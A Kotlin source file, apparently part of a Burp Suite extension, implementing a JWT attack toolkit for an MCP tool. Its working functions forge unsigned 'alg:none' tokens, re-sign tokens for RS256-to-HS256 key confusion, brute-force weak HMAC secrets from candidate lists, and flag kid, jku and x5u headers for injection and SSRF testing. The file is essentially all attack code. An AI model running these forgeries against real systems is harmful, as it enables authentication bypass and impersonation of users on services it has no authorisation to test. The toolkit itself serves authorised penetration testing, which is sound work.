package io.bitbytelab.raijin.jwt

import kotlinx.serialization.json.Json
import kotlinx.serialization.json.JsonArray
import kotlinx.serialization.json.JsonElement
import kotlinx.serialization.json.JsonNull
import kotlinx.serialization.json.JsonObject
import kotlinx.serialization.json.JsonPrimitive
import kotlinx.serialization.json.contentOrNull
import kotlinx.serialization.json.jsonObject
import java.nio.ByteBuffer
import java.nio.charset.CharacterCodingException
import java.nio.charset.CodingErrorAction
import java.security.MessageDigest
import java.time.Instant
import java.util.Base64
import javax.crypto.Mac
import javax.crypto.spec.SecretKeySpec

/**
 * Pure JWT attack toolkit — decode, forge, crack, and analyze. No Montoya
 * dependency, so it is fully unit-testable. Backs the `jwt_attack` MCP tool.
 *
 * Covers the high-value JWT bug classes the old decode-only tool missed:
 * `alg:none` forgery, RS256->HS256 key confusion (sign with the public key as
 * the HMAC secret), weak-secret cracking, and `kid`/`jku`/`x5u` injection
 * surfacing.
 *
 * Everything that re-signs works on the token as it was sent ([Raw]): only the header has to be a
 * JSON object, and a payload nobody asked to change keeps its bytes.
 */
object Jwt {
    private val urlEnc = Base64.getUrlEncoder().withoutPadding()
    private val urlDec = Base64.getUrlDecoder()

    fun b64UrlEncode(bytes: ByteArray): String = urlEnc.encodeToString(bytes)
    fun b64UrlEncode(s: String): String = b64UrlEncode(s.toByteArray(Charsets.UTF_8))
    fun b64UrlDecode(s: String): ByteArray = urlDec.decode(s)

    data class Parts(
        val header: JsonObject,
        val payload: JsonObject,
        val signature: String,
        val headerB64: String,
        val payloadB64: String
    ) {
        val alg: String? get() = header.text("alg")
        val signingInput: String get() = "$headerB64.$payloadB64"
    }

    /** Decodes a token into its header/payload objects + raw parts, or null if not a JWT. */
    fun decode(token: String): Parts? {
        val parts = token.split(".")
        if (parts.size < 2) return null
        return try {
            val header = Json.parseToJsonElement(String(b64UrlDecode(parts[0]), Charsets.UTF_8)).jsonObject
            val payload = Json.parseToJsonElement(String(b64UrlDecode(parts[1]), Charsets.UTF_8)).jsonObject
            Parts(header, payload, parts.getOrElse(2) { "" }, parts[0], parts[1])
        } catch (e: Exception) {
            null
        }
    }

    /**
     * A compact JWS as it was sent: its three base64url segments, never re-encoded, so a token can
     * be signed again over the bytes its issuer produced. Only the header has to be a JSON object.
     * The payload can be anything: an array, plain text, a nested token, claims that repeat or
     * carry the wrong type.
     */
    class Raw internal constructor(
        val headerB64: String,
        val payloadB64: String,
        val signature: String,
        val headerText: String,
        val header: JsonObject,
        val payloadBytes: ByteArray,
    ) {
        val signingInput: String get() = "$headerB64.$payloadB64"

        /** The header's `alg` as text, or null when it is missing, JSON null, an array or an object. */
        val alg: String? get() = header.text("alg")

        /** The payload as text, or null when its bytes are not UTF-8. */
        val payloadText: String? by lazy { utf8OrNull(payloadBytes) }

        /**
         * The payload parsed as JSON, or null when it is not JSON. A repeated member keeps its last
         * value. A payload that is one bare word (a nested token, `hello`) is text, not JSON.
         */
        val payloadJson: JsonElement? by lazy {
            payloadText?.let { text ->
                try {
                    Json.parseToJsonElement(text).takeUnless { it.isBareWord() }
                } catch (_: Exception) {
                    null
                }
            }
        }

        /** The claims, or null when the payload is not a JSON object. */
        val claims: JsonObject? get() = payloadJson as? JsonObject

        /** Claim names the payload carries more than once. */
        val repeatedClaims: List<String> by lazy { payloadText?.let(RawJson::repeated).orEmpty() }

        /** Header parameter names the header carries more than once. */
        val repeatedHeaders: List<String> by lazy { RawJson.repeated(headerText) }
    }

    /** Splits a compact JWS without interpreting its payload, or null when it is not one. */
    fun split(token: String): Raw? {
        val parts = token.trim().split('.')
        if (parts.size != 2 && parts.size != 3) return null
        return try {
            val headerText = String(b64UrlDecode(parts[0]), Charsets.UTF_8)
            val header = Json.parseToJsonElement(headerText) as? JsonObject ?: return null
            Raw(parts[0], parts[1], parts.getOrElse(2) { "" }, headerText, header, b64UrlDecode(parts[1]))
        } catch (_: Exception) {
            null
        }
    }

    /**
     * The header segment after [changes] are written into the header and the members in [drop] are
     * taken out. The edit happens in the header's own JSON text ([RawJson]), so every other member
     * keeps its bytes, and a header that ends up unchanged keeps its original segment.
     */
    internal fun headerSegment(raw: Raw, changes: Map<String, JsonElement>, drop: Set<String> = emptySet()): String {
        val text = RawJson.remove(raw.headerText, drop)?.let { RawJson.set(it, changes) }
            ?: throw IllegalArgumentException("Token header is not a JSON object")
        return if (text == raw.headerText) raw.headerB64 else b64UrlEncode(text)
    }

    /**
     * The payload segment to sign: the token's own segment, untouched, unless [overrides] names
     * claims. Those are written into the payload's JSON text in place ([RawJson]), which needs the
     * payload to be a JSON object.
     */
    internal fun payloadSegment(raw: Raw, overrides: JsonObject?): String {
        if (overrides.isNullOrEmpty()) return raw.payloadB64
        val merged = raw.payloadText?.let { RawJson.set(it, overrides) }
            ?: throw IllegalArgumentException(
                "payload_overrides needs a JSON object payload and this token's payload is not one. " +
                    "Leave payload_overrides out to sign the payload as it is"
            )
        return b64UrlEncode(merged)
    }

    private fun jcaAlg(alg: String): String? = when (alg.uppercase()) {
        "HS256" -> "HmacSHA256"
        "HS384" -> "HmacSHA384"
        "HS512" -> "HmacSHA512"
        else -> null
    }

    /** The HMAC of [input] under [alg], or null for a non-HMAC alg. */
    internal fun hmacBytes(input: ByteArray, key: ByteArray, alg: String): ByteArray? {
        val jca = jcaAlg(alg) ?: return null
        val mac = Mac.getInstance(jca)
        mac.init(SecretKeySpec(key, jca))
        return mac.doFinal(input)
    }

    /** Computes the base64url HMAC signature over [signingInput], or null for a non-HMAC alg. */
    fun hmac(signingInput: String, key: ByteArray, alg: String): String? =
        hmacBytes(signingInput.toByteArray(Charsets.UTF_8), key, alg)?.let { b64UrlEncode(it) }

    /** Returns the first candidate secret that reproduces an HS* token's signature, or null. */
    fun crack(token: String, candidates: List<String>): String? {
        val raw = split(token) ?: return null
        val alg = raw.alg ?: return null
        if (jcaAlg(alg) == null) return null
        val signature = try {
            b64UrlDecode(raw.signature)
        } catch (_: IllegalArgumentException) {
            return null
        }
        val input = raw.signingInput.toByteArray(Charsets.UTF_8)
        for (c in candidates) {
            if (c.isEmpty()) continue // JCA rejects a zero-length HMAC key ("Empty key"); skip, don't abort the run
            val mac = try { hmacBytes(input, c.toByteArray(Charsets.UTF_8), alg) } catch (_: Exception) { null }
            if (mac != null && MessageDigest.isEqual(mac, signature)) return c
        }
        return null
    }

    /** Forges `alg:none` variants (case permutations) with an empty signature, applying optional payload [overrides]. */
    fun forgeNone(token: String, overrides: JsonObject? = null): List<String> {
        val raw = split(token) ?: return emptyList()
        val payloadB64 = payloadSegment(raw, overrides)
        return listOf("none", "None", "NONE", "nOnE").map { alg ->
            "${headerSegment(raw, mapOf("alg" to JsonPrimitive(alg)))}.$payloadB64."
        }
    }

    /**
     * Re-signs the token with HMAC using [secret] under [alg], applying optional
     * payload [overrides]. Doubles as the RS->HS confusion primitive: pass the
     * server's public key text as [secret].
     */
    fun resign(token: String, secret: String, alg: String, overrides: JsonObject? = null): String? {
        val raw = split(token) ?: return null
        if (jcaAlg(alg) == null) return null
        val signingInput = "${headerSegment(raw, mapOf("alg" to JsonPrimitive(alg)))}.${payloadSegment(raw, overrides)}"
        val sig = hmac(signingInput, secret.toByteArray(Charsets.UTF_8), alg) ?: return null
        return "$signingInput.$sig"
    }

    data class JwtIssue(val id: String, val severity: String, val detail: String)

    /** Flags offensive properties of a token (alg family, kid/jku, exp, claims a strict parser rejects). */
    fun analyze(token: String): List<JwtIssue> {
        val raw = split(token) ?: return listOf(JwtIssue("parse_error", "info", "Not a decodable JWT."))
        val issues = mutableListOf<JwtIssue>()
        val alg = (raw.alg ?: "").uppercase()
        when {
            alg == "NONE" -> issues.add(JwtIssue("alg_none", "critical", "alg=none — if accepted, tokens can be forged unsigned (mode=forge_none)."))
            alg.startsWith("HS") -> issues.add(JwtIssue("alg_hmac", "info", "HMAC alg (${raw.alg}) — test weak-secret cracking (mode=crack)."))
            alg.startsWith("RS") || alg.startsWith("ES") || alg.startsWith("PS") ->
                issues.add(JwtIssue("alg_asymmetric", "medium", "Asymmetric alg (${raw.alg}) — test RS->HS confusion with the server's public key (mode=alg_confusion)."))
        }
        if (raw.header.containsKey("kid"))
            issues.add(JwtIssue("kid_present", "medium", "kid header present — test path-traversal / SQLi injection in the kid value."))
        if (raw.header.containsKey("jku") || raw.header.containsKey("x5u"))
            issues.add(JwtIssue("jku_x5u_present", "high", "jku/x5u header present — test SSRF and attacker-hosted key substitution."))
        if (raw.repeatedHeaders.isNotEmpty())
            issues.add(JwtIssue("duplicate_header", "medium", "Header repeats ${raw.repeatedHeaders.joinToString(", ")} — parsers disagree on which copy wins, so two components may read different header values."))
        val claims = raw.claims
        if (claims == null) {
            issues.add(JwtIssue("payload_not_object", "info", "Payload is not a JSON object, so no claims were checked. Signing modes keep its bytes as they are."))
            return issues
        }
        if (raw.repeatedClaims.isNotEmpty())
            issues.add(JwtIssue("duplicate_claims", "medium", "Payload repeats ${raw.repeatedClaims.joinToString(", ")} — parsers disagree on which copy wins, so the verifier and the application may read different values."))
        val exp = claims["exp"]
        if (exp == null || exp is JsonNull) {
            issues.add(JwtIssue("no_exp", "low", "No exp claim — token may not expire."))
            return issues
        }
        // A string that reads as a number still tells when the token expires, but it is not a NumericDate.
        val quoted = exp is JsonPrimitive && exp.isString
        val seconds = (exp as? JsonPrimitive)?.content?.trim()?.toDoubleOrNull()?.takeIf { it.isFinite() }
        if (seconds == null || quoted)
            issues.add(JwtIssue("exp_malformed", "low", "exp is ${shape(exp)}, not a NumericDate number — strict libraries reject it, lenient ones may skip the expiry check."))
        if (seconds != null && seconds < Instant.now().epochSecond)
            issues.add(JwtIssue("expired", "info", "Token is expired (exp is in the past)."))
        return issues
    }

    private fun shape(element: JsonElement): String = when {
        element is JsonObject -> "an object"
        element is JsonArray -> "an array"
        element is JsonPrimitive && element.isString -> "a string"
        else -> "the literal $element"
    }

    /**
     * [element] as valid JSON for a result that is printed: every bare word the lenient tree parser
     * let through (`NaN`, `True`, an unquoted name) becomes a string. Never used to rebuild a token.
     */
    internal fun printable(element: JsonElement): JsonElement = when {
        element is JsonObject -> JsonObject(element.mapValues { printable(it.value) })
        element is JsonArray -> JsonArray(element.map { printable(it) })
        element is JsonPrimitive && element.isBareWord() -> JsonPrimitive(element.content)
        else -> element
    }

    private val jsonNumber = Regex("-?(0|[1-9][0-9]*)(\\.[0-9]+)?([eE][+-]?[0-9]+)?")

    /** An unquoted token JSON does not define. `Json.parseToJsonElement` reads it as a literal all the same. */
    private fun JsonElement.isBareWord(): Boolean =
        this is JsonPrimitive && this !is JsonNull && !isString &&
            content != "true" && content != "false" && !jsonNumber.matches(content)

    /** A header member as text: null when it is missing, JSON null, an array or an object. */
    private fun JsonObject.text(name: String): String? = (this[name] as? JsonPrimitive)?.contentOrNull

    private fun utf8OrNull(bytes: ByteArray): String? = try {
        Charsets.UTF_8.newDecoder()
            .onMalformedInput(CodingErrorAction.REPORT)
            .onUnmappableCharacter(CodingErrorAction.REPORT)
            .decode(ByteBuffer.wrap(bytes))
            .toString()
    } catch (_: CharacterCodingException) {
        null
    }
}
